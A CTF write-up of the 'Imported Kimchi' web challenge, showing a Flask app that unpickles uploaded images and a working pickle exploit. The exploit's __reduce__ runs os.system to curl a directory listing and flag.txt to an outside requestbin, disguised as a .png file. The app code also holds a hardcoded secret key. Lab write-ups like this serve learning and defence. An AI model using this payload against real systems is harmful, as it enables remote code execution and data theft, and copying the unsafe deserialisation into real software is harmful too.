Title: Imported Kimchi
Date: 2022-03-14
Category: CTF writeups
Tags: web

# Imported kimchi

Even though I did not have the time to redeem the flag while the CTF was running I wanted to do a quick writeup since I haven't played with Pythons `pickle` module before.

The challenge was available under [https://imported-kimchi.cha.hackpack.club/](https://imported-kimchi.cha.hackpack.club/).

![challenge landing page]({static}/images/landing_page.png)

On the site a user can upload images which are then available under [https://imported-kimchi.cha.hackpack.club/images/](https://imported-kimchi.cha.hackpack.club/images/).

![upload page]({static}/images/upload.png)

The source code of the flask app was provided:

``` python
import uuid
from flask import *
from flask_bootstrap import Bootstrap
import pickle
import os

app = Flask(__name__)
Bootstrap(app)

app.secret_key = 'sup3r s3cr3t k3y'

ALLOWED_EXTENSIONS = set(['png', 'jpg', 'jpeg'])

images = set()
images.add('bibimbap.jpg')
images.add('galbi.jpg')
images.add('pickled_kimchi.jpg')

@app.route('/')
def index():
    return render_template("index.html", images=images)

@app.route('/upload', methods=['GET', 'POST'])
def upload():
    if request.method == 'POST':
        image = request.files["image"]
        if image and image.filename.split(".")[-1].lower() in ALLOWED_EXTENSIONS:
            # special file names are fun!
            extension = "." + image.filename.split(".")[-1].lower()
            fancy_name = str(uuid.uuid4()) + extension

            image.save(os.path.join('./images', fancy_name))
            flash("Successfully uploaded image! View it at /images/" + fancy_name, "success")
            return redirect(url_for('upload'))

        else:
            flash("An error occured while uploading the image! Support filetypes are: png, jpg, jpeg", "danger")
            return redirect(url_for('upload'))

    else:
        return render_template("upload.html")

@app.route('/images/<filename>')
def display_image(filename):
    try:
        pickle.loads(open('./images/' + filename, 'rb').read())
    except:
        pass
    return send_from_directory('./images', filename)

if __name__ == "__main__":
    app.run(host='0.0.0.0')
```

The problems seems to be with the use of pythons `pickle` module.
David Hamann wrote a [blog post](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) about the issue with unpickling untrusted user input.

In a similar fashion we can create a python script that creates a file that when unpickled reads the flag:

``` python
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl https://requestbin.io/1bmggxr1 -X POST -d "$(ls -la; cat flag.txt)"',))

shellcode = pickle.dumps(Exploit())
f = open('images/asdf.png', 'w+b')
f.write(bytearray(shellcode))
f.close()
```

The python script uses the `pickle.dumps` function to create a pickled object of type `Exploit`.
This class implements the `__reduce__` function that is called when the object is unpickled.
During unpickling this function uses `os.system` to read the contents of the current directory, as well as the flag and sends it via an HTTP POST request to a requestbin that can be easily created on [https://requestbin.io](https://requestbin.io)

![screenshot requestbin]({static}/images/requestbin.png)
